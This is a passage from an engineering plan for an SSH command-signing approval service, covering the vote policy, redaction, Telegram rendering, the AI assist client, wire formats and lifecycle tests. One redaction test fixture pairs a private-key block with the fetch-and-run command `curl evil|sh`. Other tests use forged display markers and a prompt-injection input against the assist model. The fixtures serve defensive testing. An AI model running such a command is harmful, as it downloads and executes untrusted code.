  - **(r5.3, critique pass 1) windows over signed steps only:** `[unsigned read, signed write TTL 60]` approved at D and unclaimed stays open until D + 60, and a first Claim at D + 1 returns signatures; `[signed write TTL 300, unsigned read]` has `first_end` = D + 300; a `command_job` with no signed step is refused at freeze; **whole seconds:** `decided_at` = 12:00:00.9 with TTL 60 → `claim_end`, the held W and the gate `Exp` are all 12:01:00, and a first Claim at 12:01:00.2 answers `expired`; **`next_due_at`:** a claimed, unreported record is due at `claim_end` (the Erase), then at the report horizon, then at its Shed age, and with only the tick running it leaves `live` at `claim_end`; **Claim precedence:** with the flusher stopped, a Claim past `claim_end` answers `expired` (`window_closed` committed), never `not_ready`; **Report split:** a report answered `signer_incompatible` or `invalid_request` commits `refused{code}`, and `storage_uncertain` leaves it owed;
  - **(r5.2) Claim totality** covers the new rows: mint `window_closed` → `expired`; a repeat Claim with erased bytes → `expired` at any `now`;
  - **(r5.2) edit supersession:** an edit entry with no `confirmed` from another epoch yields one commit that retires it and appends a fresh edit entry at the View's revision, then one `EditCard`, never a replay of the old entry; from the current epoch it yields a re-run of the same entry; challenge validity after each cut: the revision-0 challenge and the retired entry's challenge are refused, and the fresh one only once it is confirmed;
  - **(r5.2) unsigned steps:** for `[signed write, unsigned read]` with the write's result committed after its window ended, the planner yields check → marker → run for the read, with no Claim and no K16; the same after an epoch change between the steps; for `[unsigned read, signed write]` the first dispatch still needs a Claim, and Claim `materialization_error` yields outcome `error` with no dispatch; for `[write, read, write]` with the windows ended, the second write gets `expired_unexecuted` while the read runs;
  - **(r5.2) job-file deletion:** the predicate is false for a final job with an undelivered body under 7 d (count pressure or not), for one whose report is owed (a lost ack), and for one inside `submit_not_after + 24 h`; it is true at 30 d or under count pressure once bodies are gone and the report is `acked`, `refused{code}` or never owed; the raw token is dropped exactly when the predicate's (1)–(3) hold;
  - **(r5.4) effective vote policy (review 5 #1), pure:** a record frozen with `required_approvals = 2` and a requester `client-1`: one approve by `alice` → pending, a second by `bob` → approved, `decided_by` = `alice,bob`; with flags self-approval off, an approve by the operator `client-1` → pending (the vote is stored and audited, it does not count) and a deny by `client-1` does not veto; with self-approval on, `client-1`'s approve counts; the same for `sub_principal` empty and `local-uid:1000`; with `required_approvals = 1` frozen and flags claiming nothing about N, the first approve decides; a generated corpus shows `Apply`'s decision equals `Decide` under `EffectivePolicy` and never under the raw flags;
  - **(r5.6) vote room (review 7 #2), pure:** with `required_approvals = 256` (`VoteCap` 320), deny-veto off and self-approval off: 63 denies by distinct operators are accepted (63 + 256 + 1 = 320), and the 64th non-counting vote (the requester's approve) is refused `vote_refused{set_full}` with one noise event and no stored vote; 256 approves by other operators are then all accepted and the 256th decides `approved` with 319 votes stored; the same with the requester's approve among the first votes, giving the same counts; with self-approval **on**, the requester's approve counts and is accepted even after the 63 denies, and 255 other approves decide; **the flag change:** with self-approval on, the requester approves (it counts) and 63 denies are accepted (64 votes, the room limit under those flags); self-approval is then switched off (a restart), so `need` rises from 255 to 256 and the record holds `|votes| + need = 320 = VoteCap`; 256 other approves are all accepted and the 256th decides with 320 votes stored, while any non-counting vote in between is refused; with deny-veto on, the first eligible deny decides whatever the set holds; a property over generated vote sequences, flags and flag changes between votes, for N in {1, 2, 63, 64, 65, 255, 256}: a vote that counts or decides is never refused for room, `|votes| ≤ VoteCap(rec)`, every refused vote neither counts nor decides under its Vote's flags, and the record is approved as soon as N distinct operators' approves count under the flags in force (the quorum is never lowered and never made unreachable by the bound); a record encoded with `required_approvals = 257` is refused;
  - **(r5.4) re-notify authorization (review 5 #2), crash-prefix model:** a burst cut by a crash during its parts in epoch 1 (no card exists); Startup in epoch 2 sends nothing (`uncertain`); `/renotify` commits `renotify_gen = 1` with an empty card set; a crash before the burst's append; Startup in epoch 3 → exactly one burst with `gen = 1` and then one card, of kind `first` because the record never had a card entry (r5.4, critique of r5.4 C2-4); a crash after that burst's append and before its outcome → `uncertain` in epoch 4 and no further burst; a second `/renotify` before the gen-1 burst is appended is inert; a `/renotify` while a current-epoch burst has no outcome is refused; the notification view is `sending` between the Renotify commit and the burst's outcome; **(r5.4, critique of r5.4)** (i) `/renotify` on a record with a delivered card: the card is retired, the `gen = 1` burst's parts come first and exactly one `replacement` card follows them; (ii) Renotify committed between a burst's outcome commit and step 2's card append: the append's guard is false, so the `gen = 1` burst is sent and then exactly one card after it, never a card for the old burst (C1-4, C2-2); (iii) Renotify then AdminCancel, and separately Renotify then Clock expiry, before step 1 runs: no burst is sent and the view reads the last settled outcome, never `sending` (C1-5); (iv) `/renotify` on a record whose `first` entry is `uncertain`: after the `gen = 1` burst is `sent` and before the replacement entry is appended the view reads `sending`, not `uncertain`, and with a full card set the record ends `error{notification_limit}` and reads `error` (C2-3 b); (v) after a burst's outcome and before its card's outcome the view reads `sending`, never `sent` (C2-3 c);
  - **(r5.4) card outcome (review 5 #5):** the planner's step 2 commit carries `msg_id` and `outcome = sent` together; a record with a delivered card reads `sent` in its own epoch and after an epoch change; an unconfirmed `edit` entry from another epoch never makes the view `uncertain`, and a `replacement` entry with no outcome from another epoch does;
  - **(r5.4) `final_at` (review 5 #3):** each transition that makes `JobView` final (the last step's result, an abort result, an orphan marker's `indeterminate`, a check failure, an outcome) sets `final_at = now` in that commit, and no other commit sets or changes it; the retention planner removes bodies at `final_at + 7 d` and allows the job file's age path at `final_at + 30 d`, never from `created_at` or a marker's `at`;
  - **(r5.4) replay rows (review 5 #7):** every command applied twice gives exactly its SA-11 row; a repeat Claim returns byte-identical signatures, raises `claim_count` by exactly 1, calls the minter zero more times and changes no other field; AdminCancel's second answer is "already resolved" with the record unchanged;
  - **(r5.5) flush retry and reservation, pure (review 6 #1, #2):** a record approved with TTL 60 whose post-commit Flush failed has `next_due_at = claim_end` and `Unflushed = true`; in the crash-prefix model with a sink that fails once and then works, and no command after the decision, the retry list drains the outbox within two passes and an executor-style Claim loop (E25's backoff from `decided_at + 1 s`) gets signatures before `claim_end`; with the sink failing until `decided_at + 50 s`, the same Claim still succeeds before `claim_end`; with it failing for good, Claim answers `expired` at `claim_end`; (r5.5, critique of the fold) with 600 records unflushed when the sink recovers, all drain within ⌈600 / 256⌉ + 1 = 4 passes, nearest `next_due_at` first; the reservation property of SA-11 over the generator;
  - **(r5.2) `exec_submit` window:** a new id with `submit_not_after` in the past is refused `submit_window_closed` and one more than 3605 s ahead `invalid_request` (r5.2: 5 s local allowance; 3602 s ahead is accepted), both before admission; an existing id is returned whatever the time.
- **Ledger:** (r5.3) C-35, C-39, C-46 and C-47 (pure; (r5.3, critique pass 1) C-48 removed, since A1b has no reservation test and C1 and C2 close it), (r5.4) C-49, C-50, C-51 and C-53 (pure), (r5.5) C-58 and C-59 (pure), (r5.6) C-61, C-62 and C-63 (pure), C-2 (model), C-19, C-20 (pure), C-28, C-29 (pure), C-32, (r5.1) C-34, C-36 (pure), (r5.2) C-40 (pure), C-42 (pure), C-43 (pure), C-44 (pure).
- **Must not touch:** anything outside `src/approvalplan`.
- **Accept:** STD; `flock $LOCK go test -race -count=1 ./src/approvalplan/...`; **independent review of A1a, A1b and A5 together** (schema, state core and wire: high-stakes), which checks the code against §1.5 rule by rule.
- **Risk:** the core is the whole design. If a property cannot be stated, the design is wrong, not the test: stop and redesign rather than add a row.

### A2 — `src/redact` span API (E16) — parallel with A1a

- **Owns:** `src/redact/spans.go` and `src/redact/spans_test.go`. An unexported accessor in `scanner.go` is allowed only if it is needed. `writer.go` and `pem.go` are not edited. `spans.go` calls their unexported helpers from inside the package.
- **Tests:**
  - property test `RedactSpans(...).redacted == RedactString(...)` over the existing scrub/leak/spec-acceptance corpora plus fuzz;
  - an overlapping duplicate (AWS key, `PASSWORD=`) produces one span carrying both rule IDs;
  - PEM (E16): a private-key block followed by `; curl evil|sh` gives one span over the block, and the tail stays visible and byte-exact. Public certificates keep their body. An aborted BEGIN, and an unterminated private key at EOF, give the spans the Writer produces. Every case also satisfies the `redacted == RedactString` property;
  - input over 64 KiB gives `ok=false`; nil rules give identity, no spans and `ok=true`;
  - forgery rewrites are not counted.
  - Fixtures reuse the `.gitleaks.toml` allowlisted tokens (`hunter2*`, `ghp_(abcd1234efgh|unredacted)*`, `AKIA1234567890ABCDEF`).
- **Must not touch:** `scrub.go` semantics, the `markers.go` format, `ExactRedactedBytes`, rules, any existing redact test, or the `policyreview` goldens (`src/policyreview/review_test.go:140-146`).
- **Accept:**
  - STD;
  - `flock $LOCK go test -race -count=1 ./src/redact/... ./src/policyreview/... ./src/signer/backend/...`;
  - **GATEHASH equals the A0 baseline**, with the hash quoted in the commit message.
- **Risk:** gate bytes. If GATEHASH moves, keep the logic outside `src/redact` and export only a minimal unreferenced accessor, then re-measure.

### A3 — `approvalreview` renderer (K19, K20, §9.1, E22, E45, E46)

- **Depends:** A1a, A2.
- **Owns:** `src/approvalreview/**`.
- **Content:**
  - `snapshot.go`: `BuildSnapshot(plan, salt, rules)` returns a `ReviewSnapshot` holding the redacted reason and spans, plus per-step display segments built from the original bytes and spans, hidden counts, a `fully_hidden` flag and the SHA-256.
  - `neutralize.go`: calls `policyreview.EscapeBytes` (`src/policyreview/preview.go:60`) for command text, and adds `NeutralizeText` (E65) for the reason, every `AssistResult` string, legacy per-command reason fields and `trusted_display`. Hidden-span markers use non-ASCII brackets, `⟦hidden N bytes · rule-a,rule-b⟧`. All agent- and model-controlled text comes out as printable ASCII with non-ASCII shown as `\u{XXXX}`, so these markers and every other renderer glyph cannot be forged.
  - `BuildSnapshot` returns `request_unrenderable` for a v2 plan when any step's `RedactSpans` gives `ok=false`. For legacy v1 it falls back to the E16 count-unavailable rendering. It never hides unmatched bytes. The salt is zeroed after use and is not a snapshot field (E37).
  - `telegram.go`: `PackParts` with header, `part i/N`, card handle, plan-hash prefix, requester, submit and expiry times, the reason label and reason, then per command `Command k/S [route] alias → user@host:port fp=… ttl=…s sha256=<64hex>` under the label "Route (requester's registry; signer-unverified)" (E35). The update step's hash comes from the signed command bytes, and its build metadata carries the E33 client-supplied label. The K20 label appears whenever any byte is hidden; otherwise "Exact command (no hidden bytes)". Continuations read `command i, chunk j/M sha256=…`. The K16 warning (E46) is included. Bounds are 3900 bytes per part, ≤40 messages and ≤128 KiB. It also builds decision-card text for the states preparing, ready and unavailable, under an advisory byte budget: alignment, summary and concerns by severity, then effects, with an explicit omission notice.
  - `hosted.go`: the JSON view model.
- **Parity list:** every line of today's banners must map to the new renderer or appear as a listed, intended change. The banners are update (`telegram.go:980-1028`), reveal (`:1072-1092`), grant (`:1132-1163`), transfer (`:1165-1183`) and register (`:1185-1202`). Commit the list in the test file as a comment table. It is the spec for this port. (r5.2, OQ3 (b)) One intended change is listed there. On the legacy grant card (today's `:1132-1163` banner), the headline "approving this auto-signs the commands below for the whole window WITHOUT further taps" (`telegram.go:1134`) is **replaced** (r5.2), not joined, by "Older client: this grant will not auto-sign. Each write still asks for approval." A human approving a v1 grant is then not told it does something it no longer does, and the card never makes both claims. The v2 grant card keeps an auto-sign headline, because v2 grants do auto-sign. The legacy-grant and v2-grant goldens pin both.
- **Tests:**
  - goldens for single write, mixed batch with reads, reveal, update, revoke, grant, transfer, legacy sign, legacy register, (r5.2) legacy grant (the no-auto-sign line in place of the auto-sign headline, which appears nowhere on it), v2 grant (the auto-sign headline), the 32×4 KiB worst case, bidi/NUL/ESC/non-ASCII input, overlapping secrets and PEM;
  - forging attempts (`PART 2/3`, `Command 2/3`, `⟦hidden 0 bytes⟧`, `✓ Approve`, "Exact command (no hidden bytes)", or a fake K20 label), placed in **each** of the command, the reason, the assist summary, effects and concerns, and the legacy per-command reason;
  - PEM followed by a destructive tail renders the tail verbatim; a forced `ok=false` (test hook) refuses a v2 plan with `request_unrenderable` and renders a legacy v1 record count-unavailable, with no unmatched byte hidden;
  - an update step whose `trusted_display` carries a hash that does not match the command is refused, and the rendered hash always equals the hash in the command bytes;
  - salt bytes and hex never appear in the snapshot JSON, the hosted view model or Telegram text;
  - the worst-case part count;
  - a **shared fixture** `testdata/shared-fixture.json` that A8 and A11 assert against.
- **Ledger:** D-1, D-3, C-9 (warning), R5 (fixture).
- **Must not touch:** `src/policyreview`, `telegram_policy_review.go`.
- **Accept:** STD; `flock $LOCK go test -race -count=1 ./src/approvalreview/...`.
- **Risk:** Telegram counts length in characters. Output is ASCII apart from a fixed set of glyphs, so the 3900-byte bound is conservative.

### A4 — `pkg/signerkit/assist` (§8, K5–K8, E15, E36)

- **Depends:** A1a, A2.
- **Owns:** `pkg/signerkit/assist/**`.
- **Content:**
  - the `Assessor` interface;
  - `RedactForProvider`, which fails closed;
  - `Run(ctx, assessor, input, deadline)`, which returns a terminal ready or unavailable snapshot with a sanitized reason and recovers panics. The deadline is the absolute `assist_deadline` from freeze (E68). At the deadline it cancels the provider ctx and **joins** the provider goroutine before returning (E70), dropping any late result;
  - a bounded `Pool` whose `TrySubmit` returns `unavailable` ("assist busy") immediately when full, never queueing (E68). `Close` cancels and joins; (r5.8, critique of the fold) `TrySubmit` after `Close` returns a distinct `closed` result, never "full", which the engines treat as an interruption (§1.5 SA-8 steps 2 and 4: no slot is committed, Clock fills it at `assist_deadline`); a test pins `closed` after `Close`, also under concurrent `TrySubmit` calls racing `Close`;
  - `openai.go`, ported from (not moved out of) `src/signer/backend/explainer.go`: bearer token from a 0600 key file, JSON input, a 64 KiB LimitReader and strict `ValidateAssist`;
  - a versioned `PromptVersion` prompt.
- **Tests (httptest provider):**
  - happy path;
  - prose wrapper, unknown alignment, oversize body, and control/bidi in output all become `unavailable`;
  - watchdog firing at 5s with an injected clock;
  - a late response is discarded and goleak finds no provider goroutine after `Run` returns;
  - a full pool gives `unavailable` without waiting; N > pool-size concurrent jobs all end within 5s + ε;
  - provider input carries `⟦hidden N bytes⟧`, never a `[SSHGATE_REDACTED key=…]` marker or salt;
  - a panic is recovered;
  - nil rules mean **zero HTTP calls**;
  - a planted secret never appears in any provider request body;
  - a prompt-injection fixture is still only validated JSON;
  - error sanitization (no URL, no `Bearer`).
- **Ledger:** R6, R7, R8 (mechanism), (r5.8, critique of the fold) C-67 (`closed` after `Close`).
- **Must not touch:** `explainer.go`, `explainer_test.go`, `telegram*`.
- **Accept:** STD; `flock $LOCK go test -race -count=1 ./pkg/signerkit/assist/...`; `verify-no-sqlite-local`.
- **Risk:** a privacy regression. The test asserting the provider never sees the planted secret is mandatory.

### A5 — `approvalwire` + MCP approval client (E13, E25, E27; spec A.6 fixtures)

- **Depends:** A1a.
- **Owns:** `src/approvalwire/**`, `src/mcp/sign/approval_client.go`, `src/mcp/sign/approval_client_test.go`.
- **Wire:**
  - Six local kinds. Each request is one JSON line with `approval_proto:1`. Each response is `{approval_proto:1, ok:true, …}` or `{approval_proto:1, ok:false, error:{code,message}}`, with a closed set of error codes.
  - Wait and List return summaries, not plans, so frames stay under `policywire.MaxSocketFrameBytes`.
  - Hosted routes:
    - `POST /v2/approvals`
    - `GET /v2/approvals/{id}`
    - `GET /v2/approvals?limit=&cursor=`
    - `POST /v2/approvals/wait`
    - `POST /v2/approvals/{id}/claim`
    - `POST /v2/approvals/{id}/report`
  - There is no vote or cancel route on either surface.
  - **(r5)** Every hosted request may carry `requester_sub` (E19); local frames never do (the local principal comes from `SO_PEERCRED`), and the strict local decode refuses it. Summaries carry the approval, execution and notification views of §1.5 SA-6 and `pruned` for a shed record; a grant record's Get and Wait carry `grant_id` and `grant_expires_at` (E9). Claim statuses are `signatures | not_ready | denied | canceled | expired | error | execution_reported | materialization_error` (with a reason). A report is one final body with `report_sequence: 1`, per-step results, the class, `executed_ordinals`, `partial` and `result_digest`; there is no progress report. Error codes: `not_found`, `conflict`, `invalid_request`, `reserved_verb`, `request_too_large`, `request_unrenderable`, `submit_window_closed`, (r5.3, critique pass 1) `submit_window_ahead` (transient, SA-1 rule 3.5), `queue_full`, `invalid_claim`, `invalid_report`, `storage_uncertain` (retryable), (r5.6) `busy` (retryable; hosted contention at `BEGIN`, the command not applied; HTTP 503 with the envelope of E21; a local frame carries it only when the A12 proxy forwards a hosted answer), `record_corrupt`, `lifecycle_unavailable`, (r5.7, review 8 #2) `signer_incompatible` (local frames only, sent only by the A12 proxy when the hosted server answers a v2 route with a non-envelope 404; fixed message; definitive; E69). (r5.3) r5.1's `clock_regressed` is withdrawn from the closed set. `executor_claim_token_hash` appears in no response, and responses carry no `draft_hash` (r4.1's E66 consumer is gone). (r5.1) Summaries carry `created_at` and, for `in_process_sync`, `sync_claim_deadline` (E25), and every summary carries the record handle (SA-2).
- **Client:** `Submit`, `Get`, `List`, `Wait`, `Claim` and `Report` methods. It returns the typed `ErrResponseLost` when the request was written but no response came back (the `policy_client.go` precedent), `ErrSignerIncompatible` on `unsupported kind` (a pre-v2 local daemon), (r5.7) on the `signer_incompatible` frame (a current local daemon proxying an older hosted server), or on a non-envelope 404 on `/v2/approvals` (hosted, E69), and a typed retryable `ErrStorageUncertain` ((r5.3) r5.1's `ErrClockRegressed` is withdrawn), and (r5.6) a typed retryable `ErrBusy` for the `busy` envelope, distinct from both, which says the command was not applied; a 503 without an envelope (a reverse proxy) stays a transport error, transient as today; the client itself never retries. (r5.3, critique pass 1) C2 classifies every answer by SA-5's definitive/transient split. A13b keeps its own synchronous rule: it retries `storage_uncertain`, (r5.6) `busy` and Claim's `not_ready` inside the sync budget and maps every other answer to its Denial (A13b; (r5.5) a Claim `expired` after `approved` to `expired_unexecuted`, E26). Deadlines are 30 s per call, or wait + 10 s for Wait. They are safe because Submit returns at commit, before any Telegram send (E63).
- **Tests:** byte goldens for every frame and body; strict decode rejects unknown fields; a local frame carrying `requester_sub` is refused; fake-socket tests for EOF-after-write, unsupported kind and deadline; a hosted 404 maps to `ErrSignerIncompatible`; no response golden contains `executor_claim_token_hash`; `storage_uncertain` maps to `ErrStorageUncertain`, distinct from `ErrResponseLost`; (r5.6) a hosted 503 `busy` envelope maps to `ErrBusy`, distinct from both, with a byte golden of the envelope, and a 503 with no envelope maps to the transport error; a local frame carrying `busy` decodes to `ErrBusy`; (r5.7, review 8 #2) a byte golden of the `signer_incompatible` frame (E69's exact bytes), which decodes to `ErrSignerIncompatible`, as do the legacy `unsupported kind` response and a hosted non-envelope 404, while a hosted `not_found` envelope with status 404 stays `not_found`.
- **Must not touch:** `src/mcp/sign/{client,grant_client,transfer_client,register_client,policy_client}.go` and their tests; the socketrpc goldens.
- **Accept:** STD; `flock $LOCK go test -race -count=1 ./src/approvalwire/... ./src/mcp/sign/...`; `verify-mcp-closure`; independent review together with A1a and A1b.
- **Risk:** a wire freeze. The v2 family version allows additive change later.

### A6 — Lifecycle engine (memory store) (r5: A6a and A6b merged)

- **Depends:** A1b, and A4 (the engine runs the assist attempt through `assist.Run`/`Pool` under `assist_deadline`).
- **Owns:** `pkg/signerkit/lifecycle/**` (including `lifecycletest/`), and `pkg/signerkit/audit.go` plus `audit_sink.go` (the trailing `Approval *approvalplan.AuditMetadata` pointer, E23/E62, and (r5.8) E23's inert-verdict encoding).
- **Content:**
  - The `Lifecycle` interface (§7.4 + E25 + E13): `Submit`, `Get`, `ListPending`, `WaitMany`, `Claim`, `Report`, `Vote`, `AdminCancel`, `Revoke`, `ListGrants`, `ListForOperator` and `Renotify`, plus the separate `LegacyRequest` type (§1.5 SA-10) with its `LegacyNotifier` interface.
  - The narrow dependency interfaces of E62. `lifecycle` imports no `pkg/signerkit` package.
  - The `Store` interface: `Load(key)`, `Commit(key, record)` (one record, atomic), `List()`, `Remove(key)`; and `memstore.go`.
  - **The single-writer engine:** a process mutex around the store; every command is the owner-scoped load, `approvalplan.Apply`, one `Commit`, then the projections (grant, card-handle, counters, due index), then the effects. Impure inputs are resolved inside the critical section (§1.5 SA-1 rule 4): the `Minter` for a first Claim, `XferDigests` for a transfer, the deciding grant record for a grant-decided Claim.
  - **The reconciler:** `approvalplan.Next` after every commit, on a one-second tick plus the due index, and at Startup over every record ((r5.8) review 9 #3; (r5.8, critique of the fold) A6 builds the real, store-agnostic Startup below, because A6's own gate runs SA-11's crash-prefix recovery, the stop property and the restart half of the reservation case against the memory store; r5.8 had called the memory store's Startup trivial and left it to B1).
  - **(r5.8, critique of the fold) Startup (`lifecycle/startup.go`), the one function for process start, a restart and every reopen:** `Store.List` and load every record (the store reports a record it cannot validate as quarantined, with its encoded size), build the projections, the `R1Reservation` counter (quarantined entries at their encoded size) and the unflushed list, mint a new epoch, and run `Next` on every record ((r5.3) which applies Clock at the wall clock, §1.5 SA-1 rule 3.3). No ordered recovery list, no reattach, no "signer starting" answer. On the memory store a restart is a new `Lifecycle` over the same `memstore` instance, optionally through a crash wrapper that drops the last commit (landed or not). B1 adds only the file store's side: the ownership flock, `RemoveOrphanTemps`, the single View transaction behind its `List`, the decoded cache, quarantine by file and the reopen loop.
  - **The outbox flusher:** one goroutine; writes events through `AuditWriter`, then commits Flush; signatures, Shed and Delete are gated per §1.5 SA-7. (r5.1) Every commit that appends events nudges it as a post-commit effect, and a Claim held only by the flush gate waits up to 2 s for its wake-up (SA-4 Claim). (r5.5) It keeps the unflushed list (`approvalplan.Unflushed`), a projection updated after each confirmed commit, and retries every listed record each second, nearest `next_due_at` first, at most 256 per pass, stopping the pass at its first sink failure (§1.5 SA-7). The due index never carries an outbox.
  - **Notifier actors:** one per record, keyed mutex plus a nudge flag, running §1.5 SA-4's notify steps against the `Notifier` I/O interface (`SendParts`, `SendCard`, `EditCard`, `EditStatus`, `MarkIncomplete`). Each step commits between Bot API calls and re-reads before the next. Assist completion and terminal decisions only commit and nudge. (r5.1) `SendParts` and `SendCard` are methods of the session that `Notifier.Burst(ctx, fn)` opens, so the Telegram adapter can hold `policyNotifyMu` from the first part through the card's commit (E14, SA-4).
  - **(r5.1) Projections added:** the newest-grant mark (SA-6.4), and the record-handle and request-ID indexes that operator surfaces resolve through (SA-6.6).
  - **(r5.3) Time.** Every command applies Clock first through `approvalplan.Apply`; reads apply nothing. The engine has no mark. It reads time only through the injected `internal/elapsed` clock: the wall reading for `now`, and the (wall, elapsed) pair for the grant projection's held deadlines (SA-1 rule 3.4), which the tick, the Submit grant match and a grant-decided first Claim check and latch. An uncertain-commit reopen carries nothing of it (SA-8).
  - **Assist:** started only as the post-commit effect of a new Submit (K8), through `assist.Pool.TrySubmit`; a full pool commits `{unavailable, "assist busy"}`; (r5.8, critique of the fold) a `closed` pool commits nothing (an interruption, §1.5 SA-8).
  - Admission and reclamation (§1.5 SA-9) with Shed and Delete commands; (r5.5) the payload budget counts each full record at `approvalplan.R1Reservation`, released only by Shed or Delete; injected caps for tests.
  - Waiters (`WaitMany` ≤100 ids, ≤55 s), woken only after confirmed commits; `wait_elapsed` never writes.
  - `Close` ((r5.8, review 9 #2) §1.5 SA-8's owner stop) first sets the memory-only `stopping` latch under the store lock, so the commit function refuses every later commit with `lifecycle_unavailable`; then it cancels the lifecycle's own effect context, which no caller's context derives (so SIGTERM's signal context cannot cancel an actor before the latch), and joins the tick, the flusher, every actor with its edit-retry timer, every assist job and every waiter. An effect whose call returns while the latch is set, whatever it returns, is interrupted: it makes no commit, no further `Notifier` call and no INCOMPLETE edit, and is never classified `error`. (r5.8, critique of the fold) The test is the latch alone, never the error's type or a derived context's state: E50's budget or any per-call deadline ending with the latch clear is a live failure (§1.5 SA-8 step 4). `Close` is idempotent. Each actor checks the latch before every Bot API call and before every commit. B1's uncertain-commit reopen takes the same path, on the reopen loop's goroutine (§1.5 SA-8).
- **Tests:** `lifecycletest`, a conformance suite that B1 (files) and A10 (hosted) run too:
  - the §1.5 SA-11 properties against the store under test; no dependent effect (fake notifier call, waiter wake, signatures, report acknowledgement) happens before its commit;
  - idempotent Submit and `conflict`; **owner isolation: for Get, Wait, List, Claim, Report and Submit, a second principal's id answers byte-identically to a missing id, for full and shed records alike** (R3.4, F-2);
  - `wait_elapsed` is nonterminal and writes nothing; Get, List and Wait never write (a store wrapper counts commits);
  - (r5.3, X4, inverted) expiry with the tick paused: a Get at `expires_at + 1 s` still shows `pending` (R-3); a vote then commits `expired` (`decided_at = request_expires_at`) and `vote_refused` in one commit and is refused; a Get then shows `expired`; no Claim mints;
  - admission: 600 settled records under the record cap still admit a new Submit (the oldest shed or deleted); injected caps (2 live, 4 full, 6 total) refuse with `queue_full` and no notification when only protected records remain, and admit after the clock passes the protection horizon;
  - **retention never touches live work** (R1.4, R2.4, R3.3): a claimed command still running 20 minutes after its window, under payload pressure, is shed to its header, never deleted; its final report at minute 25 is accepted and Get then shows `pruned: true` with the reported class; after `report_horizon` with no report the View shows `unreported`, and a report after that is still accepted and replaces it; a denied record shed under pressure answers a same-tuple resubmit with `denied`, `pruned: true`, and a different draft with `conflict`, with no new record and no notification;
  - the submit window: a new id after `submit_not_after` gets `submit_window_closed`; an existing record, shed or not, is returned whatever the time;
  - the claim matrix in §1.5 SA-4's order, including (r5.2) Clock's `window_closed` (an approved record nobody claimed, Clock run after its first window: Claim `expired`, view `expired_unclaimed`, the negative report accepted) and a repeat Claim after Erase (`expired`), and including: `not_ready` until the outbox is flushed through the decision (the `AuditWriter` fails, then recovers); a repeat Claim inside the window returns identical bytes; signatures erased after the last window; a first Claim after the last window answers `expired` with `claim_count` still 0, the View then shows `expired_unclaimed`, and the executor-style negative report that follows is accepted;
  - the report matrix of §1.5 SA-4 through the engine, with the tick running;
  - a TTL above the route maximum is refused (`signed_write` with 61);
  - **reserved verbs (E71):** `TestV2Submit_RejectsTransferVerb_AllRoutes` (an `SSHGATE_XFER_SEND …` step under each route, with a live scope=all host-bound grant, gets `reserved_verb`: no record, no notification, no signatures, no outbox event; the v2 port of `TestSignPath_RejectsTransferVerb`, whose audit-row assertion A7 keeps at the socket, (r5.4) SA-7's refusal line); `TestV2Submit_AdminVerbMustBeSoleStep`; `TestV2Submit_RouteMislabel`; a grant draft with an `SSHGATE_` entry is refused; a stored plan corrupted to carry an XFER step is refused at the first Claim (`materialization_error`, no signature);
  - Submit returns before a slow notifier's send completes (fake notifier blocked 90 s);
  - a crash hook right after the Submit commit, before the actor starts: the next tick sends exactly one burst (R1.8);
  - **votes (K15, E72):** two concurrent approve taps produce one decision and, at Claim, one signature set; the signature TS is `decided_at` and each expiry `decided_at + TTL` ((r5.3, critique pass 1) in whole seconds, `decided_at.Unix() + TTL`); Approve is refused while preparing; a stale-revision challenge gets "card updated"; (r5.1) a same-decision re-send and an opposite re-send are each inert and each append exactly one `vote_replay` event, and a tap on a resolved record or a retired card appends one `vote_refused` event; the audit writer failing on the vote leaves the decision committed and the callback answered, withholds signatures until the flush, and never changes the decision (R3.2);
  - **(r5.1) assist digest (K8):** (r5.3) a vote that lands after `assist_deadline` with the tick paused commits Clock's `unavailable` slot first and, at revision 1 only (OA-5), binds its digest; the decision event carries it; (r5.2) the decision slot's `assist_bound` equals the event's `{state, revision, digest}` for a vote at revision 0 (Deny only), at revision 1, and after Clock's `unavailable`, and is unchanged after a Shed; **(r5.3, OA-5)** a tap on the revision-0 card after the slot committed and before the edit entry is appended is refused "card updated — tap again";
  - **(r5.3) clock, against the engine, with the `internal/elapsed` fake:** steps back of 10 s and of 1 h refuse none of Submit, Vote, AdminCancel, Revoke and deny-all, and a Claim for a record decided after the step proceeds ((r5.3, critique pass 1) a first Claim within about 5 s of a decision made just before a 10 s step back gets `materialization_error{clock_skew}`, SA-1 rule 3.2), no epoch changes, and a notifier mid-burst finishes `sent`, never `uncertain`; **review 4's grant case:** a 1 h grant approved at 12:00, then at 13:01 a step back to 12:54 → the grant is out of the projection, a grant-covered Submit gets a card (no `grant:` decision), `list_grants` never shows it live again, and no Claim returns signatures for any record whose window Clock closed by 13:01 (mint `window_closed`); a request whose expiry was committed at 13:01 refuses a vote at 12:55; the 8 h suspend fake ends a 1 h grant; a record decided while the clock ran 1 h fast gives `materialization_error{clock_skew}` at its first Claim and no signature; no minted TS exceeds the wall clock at mint by more than 5 s; the static time-read test over `pkg/signerkit/lifecycle` passes;
  - **(r5.1) flush gate on the synchronous path:** with the `AuditWriter` delayed 1 s, a grant-covered Submit followed at once by Claim, and a tap followed at once by Claim, each return signatures within the 2 s wait, with no `not_ready` answer; with the writer delayed 3 s the first Claim answers `not_ready` and a retry succeeds;
  - **(r5.5) flush retry with no further mutation (review 6 #1):** the `AuditWriter` fails exactly once, on the post-commit Flush of a human approval (TTL 60), and works afterwards; no command touches the record after the decision, and the tick runs. The outbox is flushed within 2 s, by the retry list and not by the due index (a counting due-index wrapper shows the record was never due before `claim_end`), and a Claim loop with E25's backoff, started at `decided_at + 1 s`, gets signatures before `claim_end`. With the writer failing until `decided_at + 50 s`, the Claim still gets signatures before `claim_end`; with it failing for good, Claim answers `expired` at `claim_end`. With 300 unflushed records and a dead writer, an unrelated record's `window_closed` still commits within one tick of its `claim_end`, and each pass makes one failed write;
  - **(r5.5) payload reservation (review 6 #2):** with an injected budget of 8 × the `R1Reservation` of a one-step write, 8 pending records are admitted and a 9th gets `queue_full` before any notification; then all 8 go through assist, burst and card, an edit, approval, Flush and Claim (signatures stored), and then, with the writer failing so that every later event stays unflushed, refused taps up to the noise fold and status edits: no commit is refused, every record stays within its reservation, and the sum of encoded full records never exceeds the budget; after the writer recovers, Flush, a report and Shed release space, and the next Submit is admitted; a restart rebuilds the same counter;
  - **(r5.1) synchronous claim deadline:** an `in_process_sync` record approved after `sync_claim_deadline` answers Claim `expired`, nothing is minted, (r5.3) that Claim commits `window_closed`, and the execution view shows `expired_unclaimed` at once;
  - assist: watchdog → `unavailable` → Approve; (r5.3, X4, inverted) a `preparing` record past `assist_deadline` (provider stalled, pool saturated) still shows `preparing` with the tick paused until a tick or a command commits Clock's `unavailable`, and makes no second provider call; assist cannot change `plan_hash`, quorum or signatures;
